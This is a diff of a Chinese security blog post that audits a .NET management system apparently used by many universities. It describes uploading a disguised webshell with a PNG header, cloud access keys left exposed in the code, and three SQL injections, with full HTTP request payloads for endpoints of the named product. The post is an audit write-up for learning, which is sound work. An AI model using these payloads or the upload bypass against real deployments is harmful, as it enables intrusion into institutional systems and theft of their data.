@@ -16,23 +16,22 @@
   <meta name="author" content="Zjacky">
   <meta name="keywords" content="Zjacky">
   
-    <meta name="description" content="代码审计 - .NET - 通用系统审计前言本篇原作者为@冬夏师傅，也是跟冬夏师傅学到了蛮多(他就是有点呆其他还好) PS：未经过作者同意，不可转发 ‍ 审计前置知识在此之前先了解c#​每个文件的含义，以便是0基础的师傅也能看懂什么意思 123456789101112131415aspx：应用程序根目录或子目录，包含web控件与其他cs：类文件aspx.cs：web窗体后台程序代码文件ascx：应">
+    <meta name="description" content="前言代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下.NET的站点于是有了这篇文章 ‍ 黑盒黑盒的过程大概讲述一下即可，其实就是有">
 <meta property="og:type" content="article">
 <meta property="og:title" content="代码审计 - .NET - 通用系统审计">
 <meta property="og:url" content="https://zjackky.github.io/post/code-audit-net-general-system-audit-24d238.html">
 <meta property="og:site_name" content="Zjacky Blog">
-<meta property="og:description" content="代码审计 - .NET - 通用系统审计前言本篇原作者为@冬夏师傅，也是跟冬夏师傅学到了蛮多(他就是有点呆其他还好) PS：未经过作者同意，不可转发 ‍ 审计前置知识在此之前先了解c#​每个文件的含义，以便是0基础的师傅也能看懂什么意思 123456789101112131415aspx：应用程序根目录或子目录，包含web控件与其他cs：类文件aspx.cs：web窗体后台程序代码文件ascx：应">
+<meta property="og:description" content="前言代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下.NET的站点于是有了这篇文章 ‍ 黑盒黑盒的过程大概讲述一下即可，其实就是有">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449388.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449711.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449842.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449924.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449046.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053655.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053812.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449155.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449294.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449419.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449514.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449622.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053907.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053015.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053795.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449728.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449949.png">
 <meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449312.png">
@@ -42,7 +41,7 @@
 <meta property="article:author" content="Zjacky">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449388.png">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -249,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2k 字
+          2.2k 字
         
       </span>
     
@@ -322,31 +321,29 @@
             
               <div class="markdown-body">
                 
-                <h1 id="代码审计-NET-通用系统审计"><a href="#代码审计-NET-通用系统审计" class="headerlink" title="代码审计 - .NET - 通用系统审计"></a>代码审计 - .NET - 通用系统审计</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇原作者为@冬夏师傅，也是跟冬夏师傅学到了蛮多(<del>他就是有点呆其他还好</del>)</p>
-<p>PS：未经过作者同意，不可转发</p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下<code>.NET</code>的站点于是有了这篇文章</p>
 <p>‍</p>
-<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在此之前先了解<code>c#</code>​每个文件的含义，以便是0基础的师傅也能看懂什么意思</p>
+<h1 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h1><p>黑盒的过程大概讲述一下即可，其实就是有个注册的接口进行注册，然后通过注册进去后直接上传一个免杀马(听@Segador说是还需要加入PNG的头部绕一下(其实在CTF中确实也比较常见啥PNG头啊GIF89a啊啥的都行吧))，传上去就可以解析了，于是源码就有了</p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在此之前先了解<code>c#</code>​每个文件的含义，以便是0基础的师傅也能看懂什么意思</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">aspx：应用程序根目录或子目录，包含web控件与其他cs：类文件aspx.cs：web窗体后台程序代码文件<br><br>ascx：应用程序根目录或子目录,Web 用户控件文件<br><br>asmx：应用程序根目录或子目录，该文件包含通过 SOAP 方式可用于其他 Web 应用程序的类和方法<br><br>asax：应用程序根目录，通常是Global.asax<br><br>config：应用程序根目录或子目录，通常是web.config<br><br>ashx：应用程序根目录或子目录,该文件包含实现 IHttpHandler 接口以处理所有传入请求的代码<br><br>soap:应用程序根目录或子目录 soap拓展文件dll:在ASP.NET Web应用程序中，通常会将每个页面或控件编译成一个独立的DLL文件。这些DLL文件包含了与页面相关的代码、控件、用户控件等。当用户访问网站时，ASP.NET引擎会动态加载这些DLL文件以提供所需的功能<br><br>那么就一句话概括，重点就是看dll，aspx或者aspx.cs这三个文件<br></code></pre></td></tr></table></figure>
 
 <p>‍</p>
 <p>了解每个文件的意思之后，我们在定位到<code>Default.aspx</code>​这个文件，查看<code>AutoEventWireup</code>​、<code>CodeFile</code>​、<code>Inherits</code>​这三个参数</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">AutoEventWireup（自动事件绑定）：这是一个布尔值属性，用于指示编译器是否自动连接页面的事件处理程序。如果设置为<span class="hljs-literal">true</span>，则编译器会自动尝试将命名为特定模式的方法与页面的生命周期事件相关联，例如Page_Load或Button_Click等。如果设置为<span class="hljs-literal">false</span>，则需要手动显式地将事件与处理程序绑定。<br><br>CodeFile`（代码文件：在ASP.NET中，这是指包含与页面相关代码的文件。在Web Forms中，一个页面通常由两部分组成：.aspx文件（包含HTML和控件布局）和.aspx.cs（C<span class="hljs-comment">#代码）或.aspx.vb（VB.NET代码）文件。CodeFile属性用于指定与.aspx页面关联的代码文件。Inherits（继承）：这是指定代码文件中类的基类的属性。在ASP.NET中，.aspx.cs或.aspx.vb文件中的类通常继承自ASP.NET提供的页面基类（如System.Web.UI.Page）。</span><br><br>Inherits属性用于指定页面类所继承的基类。这些概念在ASP.NET Web Forms中是很重要的，它们有助于管理页面的事件处理、代码文件的关联以及页面类的继承关系。<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449388.png" srcset="/img/loading.gif" lazyload>​</p>
-<p>在一般的<code>.NET</code>​代码中我们要重点关注<code>inherits</code>​(继承)，因为WEB应用程序会把我们写的代码编译为DLL文件存放在Bin文件夹中，在<code>ASPX</code>​文中基本就是一些控件名，所以需要反编译他的DLL来进行审计。在bin目录应该是会存在<code>_Default.dll</code>​一个主编译，但是在这个代码中没有这个文件，所以我们只能从<code>aspx.cs</code>​这些文件入手。<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449711.png" srcset="/img/loading.gif" lazyload>​</p>
-<p>‍</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>现在主流的框架都是mvc三层模型，这种一般我们都是观看controller层来进行寻找特定的方法（后续我会写这种源码怎么审计）那么这套源码也是我见过在.net算奇葩的，它通过ajax方式来访问特定的方法，这是登录页面来触发的</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449842.png" srcset="/img/loading.gif" lazyload></p>
-<p> 那么就能猜出大概的结构</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png" srcset="/img/loading.gif" lazyload></p>
+<p>在一般的<code>.NET</code>代码中我们要重点关注<code>inherits</code>(继承)，因为WEB应用程序会把我们写的代码编译为DLL文件存放在Bin文件夹中，在<code>ASPX</code>文中基本就是一些控件名，所以需要反编译他的DLL来进行审计。在bin目录应该是会存在<code>_Default.dll</code>一个主编译，但是在这个代码中没有这个文件，所以我们只能从<code>aspx.cs</code>这些文件入手。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>现在主流的框架都是mvc三层模型，这种一般我们都是观看controller层来进行寻找特定的方法（后续我会写这种源码怎么审计）那么这套源码也是我见过在.net算奇葩的，它通过ajax方式来访问特定的方法，这是登录页面来触发的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053655.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以去查看下<code>UserLogin.aspx.cs</code> </p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053812.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么就能猜出大概的结构</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/文件名（UserLogin）,App_Web_knyu3gfu.ashx?\_method=方法（login）&amp;\_session=rw（ReadWrite）<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449924.png" srcset="/img/loading.gif" lazyload></p>
-<p>既然猜出结构之后我们就寻找上传目录uploadFIle，随意一个文件发现这里直接上云的，无论怎么上传都上传不到本地。这里的aksk也是可以直接利用接管云服务器，这里主要讲代审所以接管云服务器部分不过多展示</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449046.png" srcset="/img/loading.gif" lazyload></p>
-<p>如果有师傅不懂一下代码可以直接GPT来解释，这里我不过多分析每段代码的意思</p>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C#">如果有师傅不懂一下代码可以直接GPT来解释，这里我不过多分析每段代码的意思<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">FinishFileUpload</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key, <span class="hljs-built_in">string</span> _uploadId</span>)</span><br>        &#123;<br>            <span class="hljs-built_in">string</span> res = <span class="hljs-string">&quot;0&quot;</span>;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                Aliyun.OpenServices.ClientConfiguration conf = <span class="hljs-keyword">new</span> Aliyun.OpenServices.ClientConfiguration();<br>                conf = <span class="hljs-keyword">new</span> Aliyun.OpenServices.ClientConfiguration();<br>                conf.MaxErrorRetry = <span class="hljs-number">0</span>;<br>                conf.ConnectionTimeout = <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;<br>                OssClient ossClient1 = <span class="hljs-keyword">new</span> OssClient(<span class="hljs-keyword">new</span> Uri(<span class="hljs-string">&quot;http://oss.aliyuncs.com&quot;</span>), accessId, accessKey, conf);<br><br><br>                ListPartsRequest listparts = <span class="hljs-keyword">new</span> ListPartsRequest(bucketName, key, _uploadId);<br>                PartListing partlisting = ossClient1.ListParts(listparts);<br>                List&lt;Part&gt; list = partlisting.Parts.ToList&lt;Part&gt;();<br><br>                <span class="hljs-comment">//ossClient1.</span><br>                CompleteMultipartUploadRequest cmreq = <span class="hljs-keyword">new</span> CompleteMultipartUploadRequest(bucketName, key, _uploadId);<br>                <span class="hljs-keyword">foreach</span> (Part part <span class="hljs-keyword">in</span> list)<br>                &#123;<br>                    cmreq.PartETags.Add(<span class="hljs-keyword">new</span> PartETag(part.PartNumber, part.ETag));<br>                &#125;<br>                CompleteMultipartUploadResult cmres = ossClient1.CompleteMultipartUpload(cmreq);<br>                res = cmres.BucketName;<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception)<br>            &#123;<br>                res = <span class="hljs-string">&quot;-1&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> res;<br>        &#125;<br></code></pre></td></tr></table></figure>
 
-<p>至此就不需要查看直接上云的代码，接下来就关注到LocalUploadFile.aspx.cs这个文件，这里的aksk等云方面的代码进行注释也就是说并不上云。并且这里有一个特别重要的一串代码</p>
+
+<p>既然猜出结构之后 就发现了有一个<code>UploadFile</code>​ 的目录 </p>
+<p>于是关注到<code>LoalUploadFile.aspx.cs</code>​这个文件，这里的aksk等云方面的代码进行注释也就是说并不上云。并且这里有一个特别重要的一串代码</p>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Soft51.CMServiceSystem.Web.UpLoadFile</span>在.<span class="hljs-title">NET</span>中，<span class="hljs-title">namespace</span>（命名空间）是用于组织和管理代码的一种机制。它被用来将相关的类型、类、接口、委托等组织在一起，以便更好地管理代码结构、防止命名冲突，并提高代码的可读性和可维护性。 说人话就跟<span class="hljs-title">java</span>中的<span class="hljs-title">Private</span>方法类似<br></code></pre></td></tr></table></figure>
 
 
@@ -361,25 +358,33 @@
 
 <p>至此马子进行解析</p>
 <p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449419.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h5 id="第一处sql"><a href="#第一处sql" class="headerlink" title="第一处sql"></a>第一处sql</h5><p>sql注入我目前的寻找方式，只能寻找每个参数是否代入sql语句中进行查询，下面的代码也是很明显直接将参数<code>ParentID</code>​直接代入到sql语句中并没有做过多的一个过滤</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449514.png" srcset="/img/loading.gif" lazyload></p>
-<p>那么就构造payload，根据前面所解释的结构，<code>\_mothod</code>​是方法，<code>Register_BiddingBodyRegister</code>​对应目录和文件名，session&#x3D;no是因为这里没有对session进行一个限制，并且这是一个数据型的注入，可以直接用数字型-user来进行报错处理（如果有不懂：请查看C0de大哥的文章来理解<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TIu1JaVQXQh9Jp1inhlXsQ%EF%BC%89">https://mp.weixin.qq.com/s/TIu1JaVQXQh9Jp1inhlXsQ）</a></p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449622.png" srcset="/img/loading.gif" lazyload>​</p>
-<h5 id="第二处SQL"><a href="#第二处SQL" class="headerlink" title="第二处SQL"></a>第二处SQL</h5><p>在<code>LocalUploadFile.aspx</code>​文件中，也有直接进行参数拼接的语句</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="第一处SQL"><a href="#第一处SQL" class="headerlink" title="第一处SQL"></a>第一处SQL</h3><p>sql注入我目前的寻找方式，只能寻找每个参数是否代入sql语句中进行查询(稍微理解一下，在哪存在sql？肯定是数据交互的点，比如 注册 下载 登录 查询 信息 等地方)，在查看注册代码的时候也是很明显直接将参数<code>ParentID</code>​直接代入到sql语句中并没有做过多的一个过滤(其实也就是靠猜了，猜他写的内容是否会带入到sql查询当中)</p>
+<p>下面的代码接受<code>ParentID</code>​传参并且有order by 这种字眼所以可以大胆猜测为sql查询</p>
+<p>那么就构造payload，根据前面所解释的结构，<code>\_mothod</code>​是方法，<code>Register_BiddingBodyRegister</code>​对应目录和文件名，session&#x3D;no是因为这里没有对session进行一个限制，并且这是一个数据型的注入，可以直接用数字型-user来进行报错处理</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053907.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/Register_BiddingBodyRegister,App_Web_ggq5haij.ashx?_method=GetAreaChildInfo&amp;_session=no HTTP/1.1<br>Host: xxxxxx<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 27<br>Content-Type: text/plain;charset=UTF-8<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br>sec-ch-ua: <span class="hljs-string">&quot;Not_A Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span><br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><br>parentID=1-user<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053015.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个sql两个接口都可以的</p>
+<p>这里其实有个问题，这个<code>App_Web_ggq5haij.ashx</code>​ 怎么来的啊？</p>
+<p>其实后面研究了下他是得跳转的，具体跳转到时哪个ashx文件还没有解释明白，但从注册的接口中抓包就可以抓到这个目录了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053795.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="第二处SQL"><a href="#第二处SQL" class="headerlink" title="第二处SQL"></a>第二处SQL</h3><p>在<code>LocalUploadFile.aspx</code>​文件中，也有直接进行参数拼接的语句</p>
 <p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449728.png" srcset="/img/loading.gif" lazyload></p>
 <p>根据<code>namespace</code>​命名空间，来构造payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/Soft51.CMServiceSystem.Web.UpLoadFile.LocalUpLoadFile,App_Web_o5xcnfs2.ashx?_method=getAttachmentType&amp;_session=rw<br>分别解释每段意思<br>Soft51.CMServiceSystem.Web:命名空间<br>UpLoadFile:目录<br>LocalUpLoadFile:文件<br>getAttachmentType:方法<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449949.png" srcset="/img/loading.gif" lazyload></p>
 <p>‍</p>
-<h5 id="第三处SQL"><a href="#第三处SQL" class="headerlink" title="第三处SQL"></a>第三处SQL</h5><p>在<code>PushCertApply.aspx</code>​文件中，定义一个方法和两个参数，这里的进行一个try尝试，pass参数必须为0.0才能执行code参数的代入，并且这里前后有’’所以判断是字符型，从而来闭合语句构造payload</p>
+<h3 id="第三处SQL"><a href="#第三处SQL" class="headerlink" title="第三处SQL"></a>第三处SQL</h3><p>在<code>PushCertApply.aspx</code>​文件中，定义一个方法和两个参数，这里的进行一个try尝试，pass参数必须为0.0才能执行code参数的代入，并且这里前后有’’所以判断是字符型，从而来闭合语句构造payload</p>
 <p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449312.png" srcset="/img/loading.gif" lazyload>​</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/PushCertApply,App_Web_knyu3gfu.ashx?_method=PushCertApplyByCode&amp;_session=no HTTP/1.1<br>Host: xxxx<br>Cookie: ASP.NET_SessionId=xxx<br>Content-Length: 28<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br><br><br>Code=1<span class="hljs-string">&#x27;-(1-user)-&#x27;</span><br>pass=0.0<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449416.png" srcset="/img/loading.gif" lazyload>​</p>
 <p>至此由于注入很多很多，我就不一一展示，主要展示寻找路径和理解框架，还有.net代码如何审计，这个是特例的一个例子野蛮少见的，后续我会写一篇对dll文件审计</p>
 <p>‍</p>
-<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>emm(<del>我不管这就是我跟@冬夏一起审的 Segadors就是个搬运文章的大蠢驴</del>)这篇也算是<code>.NET</code>​的审计入门吧，再次记录下</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>其实这篇<code>.NET</code>​的审计跟蛮多审计文章不同的，因为一个是他是以<code>ajax</code>​去起的接口，其次就是我们这次审计其实并无设置到他bin目录下的dll文件，为啥呢？因为他把逻辑都写在了cs文件当中了，所以算是比较好审计的了，这篇也算是<code>.NET</code>​的审计入门吧，记录下</p>
+<p>‍</p>
 
                 
               </div>
